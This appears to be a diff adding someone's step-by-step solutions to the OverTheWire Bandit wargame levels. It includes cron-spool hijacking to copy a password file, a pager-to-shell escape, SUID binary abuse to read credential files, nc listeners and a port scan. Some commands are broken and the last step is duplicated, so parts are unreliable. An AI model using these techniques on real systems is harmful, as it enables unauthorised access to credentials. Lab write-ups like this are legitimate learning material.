@@ -1,0 +1,139 @@
+steps  0 : 
+    - ssh bandit0@bandit.labs.overthewire.org -p 2220
+steps  1 :
+    show the content of the file readme
+    - cat readme
+steps  2 :
+    show the content of the file named '-'
+    - cat ./-
+steps  3 :
+    show the content of a file with space in its name
+    - cat spaces\ in\ this\ filename
+steps  4 :
+    show the content of a hidden file in the inhere directory
+    - cat inhere/.hidden 
+steps  5 :
+    show the content of the only ascii text file in the inhere directory
+    - file inhere/*
+    - cat inhere/-file07
+steps  6 :
+    find the only human readable file with size of 1033 bytes and not executable
+    - find inhere -type f -size 1033c -not -executable -exec file {} \; | grep 'text'
+    - cat inhere/maybehere07/.file2
+steps  7 :
+    find the only file owned by user bandit7 with group bandit6 33 bytes in size on the server
+    - find / -type f -size 33c -user bandit7 -group bandit6 -ls 2>/dev/null
+    - cat /var/lib/dpkg/info/bandit7.password
+steps  8 :
+    find the password next to the word millionth
+    - cat data.txt | millionth
+steps  9 :
+    find the only word uniq in the file data.txt
+    - sort data.txt | uniq -u
+steps  10:
+    find a word with the only strings in a binary file with several =
+    - strings data.txt | grep "="
+steps  11:
+    the password is in a base64 encoded file
+    - base64 -d data.txt
+steps  12:
+    The password for the next level is stored in the file data.txt, where all lowercase (a-z) and uppercase (A-Z) letters have been rotated by 13 positions
+    - tr 'A-Za-z' 'N-ZA-Mn-za-m' < data.txt
+steps  13:
+    decompress the file repeatedly compressed 
+    - xxd -r data.txt > data
+    - bunzip2 data.bz2
+    - tar -xf data.tar
+    - gunzip data.gz
+    - cat data
+steps  14:
+    connect to the server with bandit14 account with ssh on localhost
+    - ssh bandit14@localhost -i sshkey.private -p 2220
+    - cat /etc/bandit_pass/bandit14
+steps  15:
+    send the password to localhost
+    - nc localhost 30000
+steps  16:
+    Send the current user's password with openssl
+    - echo "current_user_password" | openssl s_client -connect localhost:31581 -ign_eof
+steps  17:
+    Find open port within the server and send the curent user's password using ssl to find private key
+    - nmap localhost -p 31000-32000 -sV
+    - openssl s_client -connect localhost:31790
+steps  18:
+    The password is the is the difference with password.old and password,new
+    - diff passwords.*
+steps  19:
+    Connect with ssh with no .bashrc
+    - ssh bandit18@bandit.labs.overthewire.org -p 2220 bash --noprofile
+steps  20:
+    Use the suid binary
+    - ./bandit20-do cat /etc/bandit_pass/bandit20
+steps  21:
+    Use the suid binary to connect to localhost
+    - nc -lvp 2200
+    - ./suconnect 2200
+steps  22:
+    Show the content of a cron job 
+    - cat /etc/cron.d/cronjob_bandit22
+    - cat /usr/bin/cronjob_bandit22.sh
+    - cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
+steps  23:
+    Use the script in /etc/cron.d to find the password
+    - cat /etc/cron.d/cronjob_bandit23
+    - export myname=bandit23
+    - export mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
+    - cat /tmp/$mytarget
+steps  24:
+    Hijack the script in /etc/cron.d/cronjob_bandit24 to find the password
+    - cat /etc/cron.d/cronjob_bandit24
+    - cat /usr/bin/cronjob_bandit24.sh
+    - echo -e '#!/bin/bash\ncat /etc/bandit_pass/bandit24 > /tmp/passwdnew' > /var/spool/bandit24/foo/priv
+    - cat /tmp/passwdnew
+steps  25:
+    bruteforce a connection to localhost with 0000-9999 
+    - python3 passwd.py
+steps  26:
+    force more to pass in the interactive mode
+        - resize the terminal to be very tiny
+    - ssh bandit26@localhost -i bandit26.sshkey -p 2220
+    - v
+    - :set shell=/bin/bash
+    - :shell
+    - cat /etc/bandit_pass/bandit26
+steps  27:
+    use the suid binary
+    - ./bandit27-do cat /etc/bandit_pass/bandit27
+steps  28:
+    clone a git repository 
+    - git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo.git
+    - cat repo/README
+steps  29:
+    clone a git repository and reset to another commit
+    - git clone ssh://bandit27-git@localhost:2220/home/bandit27-git/repo.git
+    - git reset --hard f08b9cc63fa1a4602fb065257633c2dae6e5651b
+    - cat repo/README
+steps  30:
+    clone a git repository and switch to another branch
+    - git clone ssh://bandit29-git@localhost:2220/home/bandit29-git/repo.git
+    - git switch dev
+    - cat repo/README
+steps  31:
+    clone a git repository and show tags
+    - git clone ssh://bandit30-git@localhost:2220/home/bandit30-git/repo.git
+    - git tag
+    - git show secret
+steps  32:
+    clone a git repository and push changes
+    - git clone ssh://bandit31-git@localhost:2220/home/bandit31-git/repo.git
+    - echo '' > .gitignore
+    - echo 'May I come in?' > key.txt
+    - git add -A
+    - git commit -m "first push"
+    - git push
+steps 33:
+    use $0 to execute a command
+    - $0
+    - cat /etc/bandit_pass/bandit33
+steps 34:
+steps 33:
